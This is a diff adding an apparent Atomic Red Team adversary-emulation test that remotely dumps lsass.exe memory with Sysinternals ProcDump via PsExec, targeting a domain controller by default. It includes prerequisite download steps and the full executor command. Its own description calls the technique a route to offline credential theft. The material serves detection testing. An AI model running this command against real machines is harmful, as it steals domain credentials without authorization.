@@ -90,6 +90,64 @@ atomic_tests:
       del "#{output_file}" >nul 2> nul
     name: command_prompt
     elevation_required: true
+- name: Remote dump LSASS.exe Memory using ProcDump
+  auto_generated_guid: f53f65e1-d830-406d-9365-237e1249229d
+  description: |
+    The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals
+    ProcDump and remote execution is done via psexec.
+
+    Especially useful against domain controllers in Active Directory environments.
+    It must be executed in the context of a user who is privileged on remote `machine`.
+
+    Upon successful execution, you should see the following file created c:\windows\temp\lsass_dump.dmp.
+
+    If you see a message saying "procdump.exe is not recognized as an internal or external command", try using the  get-prereq_commands to download and install the ProcDump tool first.
+  supported_platforms:
+  - windows
+  input_arguments:
+    machine:
+      description: machine to target (via psexec)
+      type: String
+      default: DC1
+    output_file:
+      description: Path where resulting dump should be placed
+      type: Path
+      default: C:\Windows\Temp\lsass_dump.dmp
+    procdump_exe:
+      description: Path of Procdump executable
+      type: Path
+      default: PathToAtomicsFolder\T1003.001\bin\procdump.exe
+    psexec_path:
+      description: Path to PsExec
+      type: String
+      default: C:\PSTools\PsExec.exe
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      ProcDump tool from Sysinternals must exist on disk at specified location (#{procdump_exe})
+    prereq_command: |
+      if (Test-Path #{procdump_exe}) {exit 0} else {exit 1}
+    get_prereq_command: |
+      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+      Invoke-WebRequest "https://download.sysinternals.com/files/Procdump.zip" -OutFile "$env:TEMP\Procdump.zip"
+      Expand-Archive $env:TEMP\Procdump.zip $env:TEMP\Procdump -Force
+      New-Item -ItemType Directory (Split-Path #{procdump_exe}) -Force | Out-Null
+      Copy-Item $env:TEMP\Procdump\Procdump.exe #{procdump_exe} -Force
+  - description: |
+      PsExec tool from Sysinternals must exist on disk at specified location (#{psexec_path})
+    prereq_command: |
+      if (Test-Path "#{psexec_path}") { exit 0} else { exit 1}
+    get_prereq_command: |
+      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+      Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip" -OutFile "$env:TEMP\PsTools.zip"
+      Expand-Archive $env:TEMP\PsTools.zip $env:TEMP\PsTools -Force
+      New-Item -ItemType Directory (Split-Path "#{psexec_path}") -Force | Out-Null
+      Copy-Item $env:TEMP\PsTools\PsExec.exe "#{psexec_path}" -Force
+  executor:
+    command: |
+      #{psexec_path} /accepteula \\#{machine} -c "#{procdump_exe}" -accepteula -ma lsass.exe "#{output_file}"
+    name: command_prompt
+    elevation_required: false # locally not, but remotely on target machine then yes
 - name: Dump LSASS.exe Memory using comsvcs.dll
   auto_generated_guid: 2536dee2-12fb-459a-8c37-971844fa73be
   description: |
